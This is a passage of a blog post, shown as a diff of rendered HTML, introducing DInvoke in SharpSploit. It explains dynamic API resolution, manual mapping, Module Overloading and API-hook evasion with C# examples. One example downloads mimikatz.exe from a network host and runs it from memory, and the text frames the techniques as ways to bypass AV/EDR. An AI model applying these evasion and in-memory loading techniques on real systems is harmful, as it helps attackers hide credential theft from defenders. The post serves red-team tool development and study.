+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by keyed hash --&gt; 138F2374EC295F225BD918F7D8058316 (RtlAdjustPrivilege)"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Hash : HMACMD5(Key).ComputeHash(FunctionName)"</span><span class="p">);</span>
+            <span class="n">String</span> <span class="n">fHash</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetAPIHash</span><span class="p">(</span><span class="s">"RtlAdjustPrivilege"</span><span class="p">,</span> <span class="m">0xaabb1122</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pRtlAdjustPrivilege</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetLibraryAddress</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">,</span> <span class="n">fHash</span><span class="p">,</span> <span class="m">0xaabb1122</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] pRtlAdjustPrivilege : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">pRtlAdjustPrivilege</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Search for function from base address of DLL</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Specifying the base address of DLL in memory ({0:X}), resolve function by walking its export table..."</span><span class="p">,</span> <span class="n">hNtdll</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">());</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by name --&gt; NtCommitComplete"</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pNtCommitComplete2</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetExportAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"NtCommitComplete"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] pNtCommitComplete : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">pNtCommitComplete2</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Let’s walk through the example in sequence:</p>
+
+<p>1) Get the base address of <code class="language-plaintext highlighter-rouge">ntdll.dll</code>. It is loaded into every Windows process when it is initialized, so we know that it will already be loaded. As such, we can safely search the PEB’s list of loaded modules to find a reference to it. Once we’ve found its base address from the PEB, we print the address.
+2) Use <code class="language-plaintext highlighter-rouge">GetLibraryAddress</code> to find an export within <code class="language-plaintext highlighter-rouge">ntdll.dll</code> by name.
+3) Use <code class="language-plaintext highlighter-rouge">GetLibraryAddress</code> to find an export within <code class="language-plaintext highlighter-rouge">ntdll.dll</code> by ordinal.
+4) Use <code class="language-plaintext highlighter-rouge">GetLibraryAddress</code> to find an export within <code class="language-plaintext highlighter-rouge">ntdll.dll</code> by keyed hash.
+5) Starting from the base address of <code class="language-plaintext highlighter-rouge">ntdll.dll</code> that we found earlier, use <code class="language-plaintext highlighter-rouge">GetExportAddress</code> to find an export within the module in memory by name.</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/4_Resolve.png" alt="_config.yml" title="Resolving various functions with DInvoke"></p>
+
+<h2 id="why-dinvoke">Why DInvoke?</h2>
+
+<p>DInvoke was built to allow you (the offensive tool developer) choice in not just <em>what</em> code you execute but <em>how</em> you execute it.</p>
+
+<h3 id="manual-mapping">Manual Mapping</h3>
+
+<p>DInvoke supports manual mapping of PE modules, stored either on disk or in memory. This capability can be used either for bypassing API hooking or simply to load and execute payloads from memory without touching disk.</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/theres-always-room-for-one-more-28316601.png" alt="_config.yml" title="Technique #332,769 for executing mimikatz"></p>
+
+<p>The module may either be mapped into dynamically allocated memory or into memory backed by an arbitrary file on disk. When a module is manually mapped from disk, a fresh copy of it is used. That way, any hooks that AV/EDR would normally place within it will not be present. If the manually mapped module makes calls into other modules that are hooked, then AV/EDR may still trigger. But at least all calls into the manually mapped module itself will not be caught in any hooks. This is why <a href="https://www.vkremez.com/2020/02/lets-learn-inside-parallax-rat-malware.html?m=1">malware</a> often manually maps <code class="language-plaintext highlighter-rouge">ntdll.dll</code>. They use a <a href="https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/">fresh copy to bypass any hooks</a> placed within the original copy of <code class="language-plaintext highlighter-rouge">ntdll.dll</code> loaded into the process when it was created, and force themselves to only use <code class="language-plaintext highlighter-rouge">Nt*</code> API calls located within that fresh copy of <code class="language-plaintext highlighter-rouge">ntdll.dll</code>. Since the <code class="language-plaintext highlighter-rouge">Nt*</code> API calls in <code class="language-plaintext highlighter-rouge">ntdll.dll</code> are merely wrappers for syscalls, any call into them will not inadvertantly jump into other modules that may have hooks in place.</p>
+
+<p>In addition to normal manual mapping, we also added support for Module Overloading. Module Overloading allows you to store a payload in memory (in a byte array) into memory backed by a legitimate file on disk. That way, when you execute code from it, the code will appear to execute from a legitimate, validly signed DLL on disk.</p>
+
+<p>To learn more about our manual mapping and Module Overloading implementations, check out the second post in this series (will add link once it is posted).</p>
+
+<p>A word of caution: manual mapping is complex and we do not guarantee that our implementation covers every edge case. The version we have implemented now is serviceable for many common use cases and will be improved upon over time. Additionally, manual mapping and syscall stub generation do not currently work in WOW64 processes. See the note at the end of this post.</p>
+
+<h3 id="example---calling-exports-from-memory">Example - Calling Exports from Memory</h3>
+
+<p>We go into more detail on manual mapping in our separate blog post (available later), but here is just a sample of what you could do with the capabaility.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">MapTest</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+
+        <span class="p">[</span><span class="nf">UnmanagedFunctionPointer</span><span class="p">(</span><span class="n">CallingConvention</span><span class="p">.</span><span class="n">StdCall</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">int</span> <span class="nf">TestFunc</span><span class="p">();</span>
+
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">//Test DLL project can be found at: https://github.com/FuzzySecurity/DLL-Template</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Mapping Test DLL from disk into memory!"</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"\t[+] Calling Test DLL from memory by DLLMain...\n"</span><span class="p">);</span>
+            <span class="c1">// (1) Call test DLL by DLLMain</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">PE</span><span class="p">.</span><span class="n">PE_MANUAL_MAP</span> <span class="n">ManMapTest</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">ManualMap</span><span class="p">.</span><span class="n">Map</span><span class="p">.</span><span class="nf">MapModuleToMemory</span><span class="p">(</span><span class="s">@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll"</span><span class="p">);</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">CallMappedDLLModule</span><span class="p">(</span><span class="n">ManMapTest</span><span class="p">.</span><span class="n">PEINFO</span><span class="p">,</span> <span class="n">ManMapTest</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n"</span><span class="p">);</span>
+
+            <span class="c1">// (2) Call test DLL by export (Also calls DllMain as part of init)</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">PE</span><span class="p">.</span><span class="n">PE_MANUAL_MAP</span> <span class="n">ManMapTest2</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">ManualMap</span><span class="p">.</span><span class="n">Map</span><span class="p">.</span><span class="nf">MapModuleToMemory</span><span class="p">(</span><span class="s">@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll"</span><span class="p">);</span>
+            <span class="kt">object</span><span class="p">[]</span> <span class="n">FunctionArgs</span> <span class="p">=</span> <span class="p">{</span> <span class="p">};</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">CallMappedDLLModuleExport</span><span class="p">(</span><span class="n">ManMapTest2</span><span class="p">.</span><span class="n">PEINFO</span><span class="p">,</span> <span class="n">ManMapTest2</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">,</span> <span class="s">"test"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">TestFunc</span><span class="p">),</span> <span class="n">FunctionArgs</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Mapping Test DLL from byte array and calling export!\n"</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n"</span><span class="p">);</span>
+
+            <span class="c1">// (3) Map test DLL using byte array. Call by export like above.</span>
+            <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="nf">ReadAllBytes</span><span class="p">(</span><span class="s">@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll"</span><span class="p">);</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">PE</span><span class="p">.</span><span class="n">PE_MANUAL_MAP</span> <span class="n">ManMapTest3</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">ManualMap</span><span class="p">.</span><span class="n">Map</span><span class="p">.</span><span class="nf">MapModuleToMemory</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">CallMappedDLLModuleExport</span><span class="p">(</span><span class="n">ManMapTest3</span><span class="p">.</span><span class="n">PEINFO</span><span class="p">,</span> <span class="n">ManMapTest3</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">,</span> <span class="s">"test"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">TestFunc</span><span class="p">),</span> <span class="n">FunctionArgs</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Mapping and calling Mimikatz from memory (via download from URL)!\n"</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"\t[+] Calling Mimikatz EXE from memory!\n"</span><span class="p">);</span>
+
+            <span class="c1">// (4) Mimikatz x64</span>
+            <span class="kt">byte</span><span class="p">[]</span> <span class="n">katzBytes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="nf">WebClient</span><span class="p">().</span><span class="nf">DownloadData</span><span class="p">(</span><span class="s">@"http://192.168.123.227:8000/mimikatz.exe"</span><span class="p">);</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">PE</span><span class="p">.</span><span class="n">PE_MANUAL_MAP</span> <span class="n">ManMapKatz</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">ManualMap</span><span class="p">.</span><span class="n">Map</span><span class="p">.</span><span class="nf">MapModuleToMemory</span><span class="p">(</span><span class="n">katzBytes</span><span class="p">);</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">CallMappedPEModule</span><span class="p">(</span><span class="n">ManMapKatz</span><span class="p">.</span><span class="n">PEINFO</span><span class="p">,</span> <span class="n">ManMapKatz</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>    
+
+</code></pre></div></div>
+
+<p><img src="https://thewover.github.io/images/Manual_Map/ManMap_4.PNG" alt="_config.yml" title="DInvoke and Manual Mapping"></p>
+
+<h3 id="bypass-hooking">Bypass Hooking</h3>
+
+<p>DInvoke provides you with many options for how to execute unmanaged code.</p>
+
+<ul>
+  <li>Want to bypass IAT Hooking for a suspicious function? No problem! Just use <code class="language-plaintext highlighter-rouge">GetLibraryAddress</code> or <code class="language-plaintext highlighter-rouge">GetExportAdress</code> to find the function by parsing the module’s EAT.</li>
+  <li>Want to avoid calling <code class="language-plaintext highlighter-rouge">LoadLibrary</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code>? Use <code class="language-plaintext highlighter-rouge">GetPebLdrModuleEntry</code> to find the module by searching the PEB.</li>
+  <li>Want to avoid inline hooking? Manually map a fresh copy of the module and use it without any userland hooks in place.</li>
+  <li>Want to bypass all userland hooking without leaving a PE suspiciously floating in memory? Go native and use a syscall!</li>
+</ul>
+
+<p>These are just some examples of how you could bypass hooks. The point is: by providing you with powerful and flexible primitives for determining how code is executed, all operational choices are left up to you. Choose wisely. ;-)</p>
+
+<h3 id="example---demonstrating-api-hook-evasion">Example - Demonstrating API Hook Evasion</h3>
+
+<p>Let us demonstrate evading API hook evasion using DInvoke and Manual Mapping. In the example below, we will first call <code class="language-plaintext highlighter-rouge">OpenProcess</code> normally using PInvoke. Then, we will call it in the sequence described above (minus syscalls) to demonstrate that each mechanism successfully evades API hooks.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">///Author: TheWover</span>
+<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">SpTestcase</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+
+        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">OpenProcess</span><span class="p">(</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">.</span><span class="n">ProcessAccessFlags</span> <span class="n">processAccess</span><span class="p">,</span>
+            <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span>
+            <span class="kt">uint</span> <span class="n">processId</span>
+        <span class="p">);</span>
+
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// Details</span>
+            <span class="n">String</span> <span class="n">testDetail</span> <span class="p">=</span> <span class="s">@"
+            #=================&gt;
+            # Hello there!
+            # I demonstrate API Hooking bypasses
+            # by calling OpenProcess via
+            # PInvoke then DInvoke.
+            # All handles are requested with
+            # PROCESS_ALL_ACCESS permissions.
+            #=================&gt;
+            "</span><span class="p">;</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">testDetail</span><span class="p">);</span>
+
+            <span class="c1">//PID of current process.</span>
+            <span class="kt">uint</span> <span class="n">id</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="nf">GetCurrentProcess</span><span class="p">().</span><span class="n">Id</span><span class="p">);</span>
+
+            <span class="c1">//Process handle</span>
+            <span class="n">IntPtr</span> <span class="n">hProc</span><span class="p">;</span>
+
+            <span class="c1">// Create the array for the parameters for OpenProcess</span>
+            <span class="kt">object</span><span class="p">[]</span> <span class="n">paramaters</span> <span class="p">=</span>
+            <span class="p">{</span>
+                <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">.</span><span class="n">ProcessAccessFlags</span><span class="p">.</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span>
+                <span class="k">false</span><span class="p">,</span>
+                <span class="n">id</span>
+            <span class="p">};</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+            <span class="c1">//////////////////////////////////////////////////////////////////////////////////////////////////////////</span>
+            <span class="c1">// Call OpenProcess using PInvoke</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Call OpenProcess via PInvoke ..."</span><span class="p">);</span>
+            <span class="n">hProc</span> <span class="p">=</span> <span class="nf">OpenProcess</span><span class="p">(</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">.</span><span class="n">ProcessAccessFlags</span><span class="p">.</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Process handle : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">hProc</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+            <span class="c1">//////////////////////////////////////////////////////////////////////////////////////////////////////////</span>
+            <span class="c1">// Call OpenProcess using GetLibraryAddress (underneath the hood)</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Call OpenProcess from the loaded module list using System.Diagnostics.Process.GetCurrentProcess().Modules ..."</span><span class="p">);</span>
+            <span class="n">hProc</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="nf">OpenProcess</span><span class="p">(</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">.</span><span class="n">ProcessAccessFlags</span><span class="p">.</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Process handle : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">hProc</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+            <span class="c1">//////////////////////////////////////////////////////////////////////////////////////////////////////////</span>
+            <span class="c1">// Search function by name from module in PEB</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Specifying the name of a DLL (\"kernel32.dll\"), search the PEB for the loaded module and resolve a function by walking the export table in-memory..."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by name --&gt; OpenProcess"</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pkernel32</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetPebLdrModuleEntry</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pOpenProcess</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetExportAddress</span><span class="p">(</span><span class="n">pkernel32</span><span class="p">,</span> <span class="s">"OpenProcess"</span><span class="p">);</span>
+
+            <span class="c1">//Call OpenProcess</span>
+            <span class="n">hProc</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">DynamicFunctionInvoke</span><span class="p">(</span><span class="n">pOpenProcess</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Delegates</span><span class="p">.</span><span class="n">OpenProcess</span><span class="p">),</span> <span class="k">ref</span> <span class="n">paramaters</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Process Handle : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">hProc</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+            <span class="c1">//////////////////////////////////////////////////////////////////////////////////////////////////////////</span>
+            <span class="c1">// Manually map kernel32.dll</span>
+            <span class="c1">// Search function by name from module in PEB</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Manually map a fresh copy of a DLL (\"kernel32.dll\"), and resolve a function by walking the export table in-memory..."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by name --&gt; OpenProcess"</span><span class="p">);</span>
+            <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">PE</span><span class="p">.</span><span class="n">PE_MANUAL_MAP</span> <span class="n">moduleDetails</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">ManualMap</span><span class="p">.</span><span class="n">Map</span><span class="p">.</span><span class="nf">MapModuleToMemory</span><span class="p">(</span><span class="s">"C:\\Windows\\System32\\kernel32.dll"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Module Base : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">moduleDetails</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">//Call OpenProcess</span>
+            <span class="n">hProc</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">CallMappedDLLModuleExport</span><span class="p">(</span><span class="n">moduleDetails</span><span class="p">.</span><span class="n">PEINFO</span><span class="p">,</span> <span class="n">moduleDetails</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">,</span> <span class="s">"OpenProcess"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Delegates</span><span class="p">.</span><span class="n">OpenProcess</span><span class="p">),</span> <span class="n">paramaters</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Process Handle : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">hProc</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+            <span class="c1">//////////////////////////////////////////////////////////////////////////////////////////////////////////</span>
+            <span class="c1">// Map kernel32.dll using Module Overloading</span>
+            <span class="c1">// Search function by name from module in PEB</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Use Module Overloading to map a fresh copy of a DLL (\"kernel32.dll\") into memory backed by another file on disk. Resolve a function by walking the export table in-memory..."</span><span class="p">);</span>
